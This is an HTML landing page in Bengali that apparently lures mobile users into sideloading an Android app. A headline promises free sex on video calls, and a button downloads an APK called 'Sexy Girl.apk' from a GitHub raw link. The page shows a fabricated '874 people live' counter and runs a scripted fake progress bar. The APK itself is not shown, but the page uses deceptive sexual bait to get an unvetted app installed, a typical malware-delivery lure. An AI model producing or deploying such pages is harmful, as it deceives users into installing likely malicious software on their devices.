<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Download Center</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Hind Siliguri', sans-serif; }
        
        body, html { 
            height: 100%; width: 100%; background: #000; 
            overflow: hidden; display: flex; flex-direction: column;
        }

        .main-wrapper {
            display: flex; flex-direction: column; height: 100vh;
            justify-content: space-between; padding: 3vh 5vw; text-align: center;
        }

        .title {
            font-size: 6.5vw; font-weight: 900; color: #fff; line-height: 1.2;
            background: linear-gradient(to right, #fff, #ff0055, #ffcc00);
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
        }

        /* ৩ডি বাটন */
        .dl-btn {
            display: block; width: 85%; margin: 3vh auto 2vh auto;
            padding: 4.5vw; font-size: 7.5vw; font-weight: 900; color: #fff;
            text-decoration: none; background: linear-gradient(180deg, #ff0000 0%, #990000 100%);
            border-radius: 50px; border-top: 3px solid #ff7777;
            border-bottom: 8px solid #550000; box-shadow: 0 10px 20px rgba(255, 0, 0, 0.3);
            position: relative; cursor: pointer;
        }

        .dl-btn:active { transform: translateY(4px); border-bottom: 3px solid #550000; }

        /* লোডিং বার - শুরুতে খালি থাকবে */
        .load-box {
            width: 85%; margin: 0 auto; background: #111; height: 9vw;
            border-radius: 50px; position: relative; overflow: hidden;
            border: 1px solid #222; display: none; /* শুরুতে লুকানো থাকবে */
        }

        .bar {
            height: 100%; width: 0%;
            background: linear-gradient(90deg, #ff0055, #ffcc00);
            border-radius: 50px;
        }

        .percent-text {
            position: absolute; width: 100%; left: 0; top: 0;
            line-height: 9vw; font-size: 4vw; font-weight: 900; color: #fff;
        }

        .status { color: #00ff88; font-size: 4.5vw; font-weight: 700; margin-top: 2vh; }

        .img-wrap { flex-grow: 1; display: flex; align-items: center; justify-content: center; overflow: hidden; margin-top: 1vh; }
        .img-wrap img { width: 100%; height: 100%; object-fit: contain; }

        /* লোডিং অ্যানিমেশন ক্লাস */
        .start-load { animation: loadingAnim 4s forwards linear; }
        @keyframes loadingAnim { 0% { width: 0%; } 100% { width: 100%; } }
    </style>
</head>
<body>

    <div class="main-wrapper">
        <div class="top">
            <h1 class="title">ভিডিও কলে ফ্রিতে সেক্স করতে চাইলে এখনই অ্যাপটি ডাউনলোড করুন</h1>
            
            <a href="https://raw.githubusercontent.com/sexbd24/Sexbd/main/Sexy%20Girl.apk" 
               class="dl-btn" onclick="startDownload()">ডাউনলোড করুন</a>

            <div class="load-box" id="loadBox">
                <div class="bar" id="progressBar"></div>
                <div class="percent-text" id="statusText">ডাউনলোড শুরু হচ্ছে...</div>
            </div>

            <div class="status">● ৮৭৪ জন লাইভে আছে</div>
        </div>

        <div class="img-wrap">
            <img src="https://raw.githubusercontent.com/sexbd24/Video/main/IMG_20260507_185112_553.png" alt="Preview">
        </div>
    </div>

    <script>
        function startDownload() {
            // লোডিং বক্স দেখাবে
            document.getElementById('loadBox').style.display = 'block';
            
            // লোডিং বার শুরু হবে
            var bar = document.getElementById('progressBar');
            bar.classList.add('start-load');
            
            // লেখা পরিবর্তন হবে
            setTimeout(function() {
                document.getElementById('statusText').innerHTML = "ডাউনলোড হচ্ছে ৫৪%";
            }, 1500);
            
            setTimeout(function() {
                document.getElementById('statusText').innerHTML = "ডাউনলোড সম্পন্ন হয়েছে!";
            }, 4000);
        }
    </script>

</body>
</html>
